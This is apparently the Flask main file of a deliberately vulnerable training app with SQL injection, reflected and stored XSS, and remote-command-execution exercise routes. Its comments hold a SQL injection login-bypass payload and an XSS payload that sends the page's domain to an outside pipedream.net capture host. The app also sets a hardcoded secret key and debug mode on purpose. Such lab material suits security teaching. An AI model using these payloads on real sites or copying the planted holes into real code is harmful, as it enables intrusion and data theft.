from flask import Flask
from flask import render_template, flash, redirect, url_for
from forms import LoginForm, MessageForm, NoteForm

from func import make_task_sqli, check_user_sqli, make_task_xss_stor, get_notes_xss_stor, add_note_xss_stor, run_command, write_message_rce

app = Flask(__name__)
app.secret_key = "superkey"

@app.before_first_request
def create_tasks():
    make_task_sqli()
    make_task_xss_stor()

@app.route('/')
def index():
    return render_template("index.html")

@app.route('/sqli', methods = ['GET', 'POST'])
def sqli():

    # password == 1" OR 1=1 --

    lf = LoginForm()
    if lf.validate_on_submit():
        result = check_user_sqli(lf.username.data, lf.password.data)
        if result:
           return render_template("sqli.html", username = lf.username.data, result = result)
        else:
            flash('Incorrect data!')
    return render_template("sqli.html", form = lf, username = 'guest')

@app.route('/xss_ref', methods = ['POST', 'GET'])
def xss_ref():
    
    # <img src="https://happypik.ru/wp-content/uploads/2019/09/odinokij-volk16.jpg" width=50 height=50>

    # 1337<script>var img = new Image();img.src = "https://enm3vddkwx8b.x.pipedream.net?some_data=" + document.domain;document.getElementById('body').appendChild(img);</script>

    mf = MessageForm()
    if mf.validate_on_submit():
        flash("Your message: '{}' was pushed!".format(mf.message.data))
    return render_template('xss_ref.html', form = mf)

@app.route('/xss_stor', methods = ['POST', 'GET'])
def xss_stor():
    notes = get_notes_xss_stor()
    nf = NoteForm()
    if nf.validate_on_submit():
        add_note_xss_stor(nf.username.data, nf.note.data)
        flash('Note was added!')
        return redirect(url_for('xss_stor'))
    return render_template('xss_stor.html', form = nf, notes = notes)

@app.route('/rce', methods = ['GET', 'POST'])
def rce():
    mf = MessageForm()
    if mf.validate_on_submit():
        result = write_message_rce(mf.message.data)
        if len(result) == 0:
            flash('Message saved!')
        else:
            flash(result)
    return render_template('rce.html', form = mf)

if __name__ == "__main__":
    app.run(debug=True)